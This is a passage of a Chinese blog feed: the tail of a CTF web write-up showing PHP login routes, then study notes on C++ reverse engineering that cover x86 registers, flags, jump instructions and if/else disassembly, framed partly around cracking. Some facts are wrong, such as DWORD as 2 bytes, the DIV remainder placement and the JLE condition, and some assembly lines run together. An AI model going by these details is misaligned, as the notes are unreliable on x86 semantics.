class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;login&quot;</span>,[<span class="hljs-string">&quot;fail&quot;</span>=&gt;<span class="hljs-variable">$request</span>-&gt;query-&gt;fail],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;POST /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span>  = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$request</span>-&gt;data-&gt;username === <span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$request</span>-&gt;data-&gt;password === <span class="hljs-variable">$password</span>)&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login?fail=1&quot;</span>);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;index&quot;</span>,[],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;start();<br></code></pre></td></tr></table></figure><p>我就直接暴躁，不懂别人怎么做的了，也许是直接给源码了，我这里是啥也没有</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>C++逆向笔记</title>
    <link href="https://d3n13d.github.io/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/"/>
    <id>https://d3n13d.github.io/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/</id>
    <published>2022-01-07T08:44:13.000Z</published>
    <updated>2022-01-09T03:43:46.330Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息安全-C-逆向"><a href="#信息安全-C-逆向" class="headerlink" title="信息安全-C++逆向"></a>信息安全-C++逆向</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="存储单位"><a href="#存储单位" class="headerlink" title="存储单位"></a>存储单位</h3><p>​    bit     最小单位 0/1</p><p>​    Byte  1Byte=8bit</p><p>​    DWORD   1DWORD=2Byte</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>​    eax    累加器寄存器，用于进行数学运算。</p><p>​    ebx    基数寄存器</p><p>​    ecx    计数器</p><p>​    edx    数据寄存器</p><p>​    ESI    原地址寄存器</p><p>​    EDI    目的寄存器</p><p>​    EBP    栈底    </p><p>​    ESP    栈顶</p><p>​    EIP    指令寄存器，EIP指向下一个将会被执行的指令。</p><p>寄存器大小都是32位 (四个字节) 。它们可以储存值为从0-FFFFFFFF (无符号)的数据</p><h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><ol><li>CS -&gt; ‘code segment’(代码段寄存器)：用于存放应用程序代码所在段的段基址(之后会说明)</li><li>DS -&gt; ‘data segment’(数据段寄存器)：用于存放数据段的段基址(以后会说明)</li><li>ES -&gt; ‘extra segment’(附加段寄存器)：用于存放程序使用的附加数据段的基地址</li><li>SS -&gt; ‘stack segment’(栈段寄存器)：用于存放栈段的段基址(以后会说明)</li></ol><h4 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h4><p>ZF、OF、CF</p><p><strong>Z-Flag(零标志)：</strong></p><p>ZF是破解中用得最多的寄存器(通常情况下占了90%)，它可以设成0或者1。若上一个运算结果为0，则其值为1，否则其值为0。(你可能会问为什么‘CMP’可以操作ZF寄存器，这是因为该指令在做比较操作(等于、不等于)，那什么时候结果是0什么时候是1呢？待会再说) </p><p><strong>The O-Flag(溢出标志)：</strong></p><p>OF寄存器在逆向工程中大概占了4%，当上一步操作改变了某寄存器的最高有效位时，OF寄存器会被设置成1。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了(你可以使用电脑自带计算器将这个16进制转化成2进制看看)。还有当上一步操作产生溢出时(即算术运算超出了有符号数的表示范围)，OF寄存器也会被设置成1。 </p><p><strong>The C-Flag(进位标志)：</strong></p><p>进位寄存器的使用大概占了1%，如果产生了溢出，就会被设置成1。例，假如某寄存器值为FFFFFFFF，再加上1就会产生溢出，你可以用电脑自带的计算器尝试。 </p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p><strong>CALL (调用)</strong></p><p>语法：CALL something</p><p>CALL指令将当前的相对地址(IP)压入栈中，并且调用CALL 后的子程序</p><p>CALL 可以这样使用：</p><figure class="highlight html"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs html">CALL 404000                ;; 最常见: CALL 地址CALL EAX                   ;<br>; CALL 寄存器 - 如果寄存器存的值为404000，那就等同于第一种情况CALL DWORD PTR [EAX]       ;; <br>CALL [EAX]偏移量所指向的地址CALL DWORD PTR [EAX+5]     ;;‘’<br>CALL [EAX+5]偏移量所指向的地址<br></code></pre></td></tr></table></figure><p><strong>CDQ</strong></p><p>语法：CDQ</p><p>CDQ指令第一次出现时通常不好理解。它通常出现在除法前面，作用是将EDX的所有位变成EAX最高位的值，</p><p>比如当EAX&gt;=80000000h时，其二进制最高位为1，则EDX被32位全赋值为1，即FFFFFFFF</p><p>若EAX&lt;80000000，则其二进制最高位为0，EDX为00000000。</p><p>然后将EDX：EAX组成新数(64位)：FFFFFFFF 80000000</p><p><strong>DEC (自减)</strong></p><p>语法: DEC something</p><p>dec用来自减1，相当于c中的–</p><p>dec可以有以下使用方式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">dec eax                             ;; eax自减1dec [eax]                           ;; 偏移量为eax的值自减1dec [401000]                        ;; 偏移量为401000的值自减1dec [eax+401000]                    ;; 偏移量为eax+401000的值自减1<br></code></pre></td></tr></table></figure><p>dec指令可以标记ZF、OF</p><p><strong>DIV (除)</strong></p><p>语法: DIV 除数</p><p>DIV指令用来将EAX除以除数(无符号除法)，被除数通常是EAX，结果也储存在EAX中，而被除数对除数取的模存在除数中。</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">mov eax,64                      ;<br>; EAX = 64h = 100<br>mov ecx,9                       ;; <br>ECX = 9<br>div ecx                         ;; EAX除以ECX<br></code></pre></td></tr></table></figure><p>在除法之后 EAX = 100/9 = 0B(十进制：11) 并且 ECX = 100 MOD 9 = 1</p><p>div指令可以标记CF、OF、ZF</p><p><strong>IDIV (整除)</strong></p><p>语法: IDIV 除数</p><p>IDIV执行方式同div一样，不过IDIV是有符号的除法</p><p>idiv指令可以标记CF、OC、ZF</p><p><strong>IMUL (整乘)</strong></p><p>语法：IMUL 数值</p><p>IMUL 目标寄存器、数值、数值</p><p>IMUL 目标寄存器、数值</p><p>IMUL指令可以把让EAX乘上一个数(INUL 数值)或者让两个数值相乘并把乘积放在目标寄存器中(IMUL 目标寄存器, 数值,数值)或者将目标寄存器乘上某数值(IMUL 目标寄存器, 数值)</p><p>如果乘积太大目标寄存器装不下，那OF、CF都会被标记，ZF也会被标记</p><p><strong>JUMPS</strong></p><p>这些都是最重要的跳转指令和触发条件(重要用*标记，最重要用**标记)：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html">指令                条件                    条件<br>JA*          -    如果大于就跳转(无符号)      - CF=0 and ZF=0<br>JAE          -    如果大于或等于就跳转(无符号)- CF=0JB*          -    如果小于就跳转(无符号)   - CF=<br>1JBE          -    如果小于或等于就跳转(无符号)- CF=1 or ZF=1<br>JC           -    如果CF被标记就了跳转       - CF=1JCXZ         -    如果CX等于0就跳转      - CX=0<br>JE**         -    如果相等就跳转        - ZF=1<br>JECXZ        -    如果ECX等于0就跳转       - ECX=0JG*          -    如果大于就跳转(有符号)   - ZF=0 and SF=OF (SF = Sign Flag)<br><br>JL          -    如果小于就跳转(有符号)    - SF != OF (!= is not)<br>JLE         -    如果小于或等于就跳转(有符号 - ZF=1 and OF != OF<br>JMP      -    跳转             - 强制跳转JNA          -    如果不大于就跳转(无符号)   - CF=1 or ZF=1<br>JNAE         -    如果不大于等于就跳转(无符号) - CF=1<br>JNB          -    如果不小于就跳转(无符号)   - CF=0JNBE         -    如果不小于等于就跳转(无符号) - CF=0 and ZF=0JNC          -    如果CF未被标记就跳转     - CF=0JNE**        -    如果不等于就跳转       - ZF=0JNG          -    如果不大于就跳转(有符号)   - ZF=1 or SF!=OF<br>JGE*         -    如果大于或等于就跳转(有符号) - SF=OF<br>JNGE         -    如果不大于等于就跳转(有符号) - SF!=OF<br>JNL          -    如果不小于就跳转(有符号)   - SF=OF<br>JNLE         -    如果不小于等于就跳转(有符号) - ZF=0 and SF=OF<br>JNO          -    如果OF未被标记就跳转     - OF=0<br>JNP          -    如果PF未被标记就跳转     - PF=0<br>JNS          -    如果SF未被标记就跳转      - SF=0<br>JNZ          -    如果不等于0就跳转      - ZF=0JO           -    如果OF被标记就跳转     - OF=1JP           -    如果PF被标记就跳转     - PF=1<br>JPE          -    如果是偶数就跳转       - PF=1JPO          -    如果是奇数就跳转       - PF=0<br>JS           -    如果SF被标记就跳转     - SF=1<br>JZ           -    如果等于0就跳转      - ZF=1<br></code></pre></td></tr></table></figure><p><strong>MUL (乘法)</strong></p><p>语法：MUL 数值</p><p>这个指令同IMUL一样，不过MUL可以乘无符号数。</p><p><strong>REP/REPE/REPZ/REPNE/REPNZ</strong></p><p>语法: REP/REPE/REPZ/REPNE/REPNZ ins</p><p>重复上面的指令：直到CX=0。ins必须是一个操作符，比如CMPS、INS、LODS、MOVS、OUTS、SCAS 或 STOS</p><p><strong>RET (返回)</strong></p><p>语法：RET</p><p>RET digit</p><p>RET指令的功能是从一个代码区域中退出到调用CALL的指令处。</p><p>RET digit在返回前会清理栈</p><p><strong>TEST</strong></p><p>语法：TEST 操作符、操作符</p><p>这个指令99%都是用于”TEST EAX, EAX”，它执行与AND相同的功能，但是并不储存数据。如果EAX=0就会标记ZF，如果EAX不是0，就会清空ZF</p><p><strong>XOR</strong></p><p>语法：XOR 目的数,源数</p><p>XOR指令对两个数进行异或操作</p><p>这个指令清空OF、CF，但会标记ZF</p><p>为了更好的理解，思考下面的二进制串：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">1001010110 0101001101<br></code></pre></td></tr></table></figure><p>如果异或它们，结果将是1100011011</p><p>如果两个值相等，则结果为0，否则为1，你可以使用计算器验算。</p><p>很多情况下我们会使用”XOR EAX, EAX”，这个操作是将EAX赋值为0，因为当一个值异或其自身，就过都是0。</p><h2 id="选择结构语句"><a href="#选择结构语句" class="headerlink" title="选择结构语句"></a>选择结构语句</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><h4 id="Only-ifelse"><a href="#Only-ifelse" class="headerlink" title="Only ifelse"></a>Only ifelse</h4><p>特点：</p><p>​    cmp ;条件反写，为了跳过后面的jxx 进而执行代码块内容</p><p>​    if else则都是往增量地址跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">0</span>)<br>    &#123;<br>        nNumber = <span class="hljs-number">0</span>;                <span class="hljs-comment">//第一种情况下无分支</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        nNumber = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">main proc near</span><br><span class="hljs-function"></span><br><span class="hljs-function">var_4</span>= dword ptr <span class="hljs-number">-4</span><br>arg_0= dword ptr  <span class="hljs-number">10</span>h<br>arg_8= qword ptr  <span class="hljs-number">18</span>h<br><br>push    rbp<br>mov     rbp, rsp  <span class="hljs-comment">//初始化栈</span><br>sub     rsp, <span class="hljs-number">30</span>h   <span class="hljs-comment">//开辟栈</span><br>mov     [rbp+arg_0], ecx <br>mov     [rbp+arg_8], rdx<br>call    __main<br>mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//[rbp-4] =0 val1=0</span><br>lea     rax, [rbp+var_4]  <br>mov     rdx, rax<br>lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>call    <span class="hljs-built_in">scanf</span>  <span class="hljs-comment">//scanf读入数据</span><br>cmp     [rbp+arg_0], <span class="hljs-number">0</span>   <span class="hljs-comment">// argc==0</span><br>jnz     <span class="hljs-keyword">short</span> loc_40158D<br>       <span class="hljs-comment">//分支1</span><br>        mov     [rbp+var_4], <span class="hljs-number">0</span>  <br>jmp     <span class="hljs-keyword">short</span> loc_401594<br>       <span class="hljs-comment">//分支2</span><br>        loc_40158D:<br>mov     [rbp+var_4], <span class="hljs-number">0F</span>FFFFFFFh <span class="hljs-comment">// 代码中体现的是变量值=-1 这里为什么是0FFFFFFFF</span><br>     <br></code></pre></td></tr></table></figure><h4 id="onlyifelse1"><a href="#onlyifelse1" class="headerlink" title="onlyifelse1"></a>onlyifelse1</h4><p>特点：</p><p>​    不能调换if和else的位置，因为代码的位置不能变，否则某些依赖代码位置的计算会出错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == nNumber)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">5</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//对应argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h    <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main     <span class="hljs-comment">//main函数开始</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  ; var_a=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]    <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax        ; rdx=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, [rbp+arg_0]  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401581</span>                 mov     eax, [rbp+var_4] <span class="hljs-comment">//var_a=0</span><br>.text:<span class="hljs-number">0000000000401584</span>                 cmp     edx, eax  <span class="hljs-comment">//if(argc==var_a)&#123; var_a=var_a/8;printf(&quot;%d&quot;,); &#125;</span><br>.text:<span class="hljs-number">0000000000401586</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159E<br>.text:<span class="hljs-number">0000000000401588</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=0</span><br>.text:<span class="hljs-number">000000000040158B</span>                 shr     eax, <span class="hljs-number">3</span>          ; /<span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040158</span>E                 mov     edx, eax  <br>.text:<span class="hljs-number">0000000000401590</span>                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401597</span>                 call    <span class="hljs-built_in">printf</span>   <br>.text:<span class="hljs-number">000000000040159</span>C                 jmp     <span class="hljs-keyword">short</span> loc_4015BB<br>.text:<span class="hljs-number">000000000040159</span>E ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040159</span>E<br>.text:<span class="hljs-number">000000000040159</span>E loc_40159E:                             ; CODE XREF: main+<span class="hljs-number">36</span>↑j  <span class="hljs-comment">//else </span><br>.text:<span class="hljs-number">000000000040159</span>E                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=var_a</span><br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     edx, <span class="hljs-number">0</span>CCCCCCCDh<br>.text:<span class="hljs-number">00000000004015</span>A6                 mul     edx   <span class="hljs-comment">//eax * 0CCCCCCCDh</span><br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     eax, edx  <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 shr     eax, <span class="hljs-number">2</span>   <span class="hljs-comment">//eax/4</span><br>.text:<span class="hljs-number">00000000004015</span>AD                 mov     edx, eax<br>.text:<span class="hljs-number">00000000004015</span>AF                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>6                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>B<br>.text:<span class="hljs-number">00000000004015B</span>B loc_4015BB:                             ; CODE XREF: main+<span class="hljs-number">4</span>C↑j<br>.text:<span class="hljs-number">00000000004015B</span>B                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">00000000004015B</span>E                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>C2                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>C3                 retn<br>.text:<span class="hljs-number">00000000004015</span>C3 main            endp<br></code></pre></td></tr></table></figure><h4 id="ifelseifelse结构"><a href="#ifelseifelse结构" class="headerlink" title="ifelseifelse结构"></a>ifelseifelse结构</h4><p>当每个跳转指令的跳转地址之前都紧跟着 jmp指令，并且他们的跳转地址都一样时，可视为一个 多分支结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nVar_4 = <span class="hljs-number">5</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nVar_4);<br><br>  <span class="hljs-comment">// argc == 0 ? 0 : -1</span><br>  <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 0\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">1</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 1\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">2</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 2\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">3</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 3\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;else\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> nVar_4;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 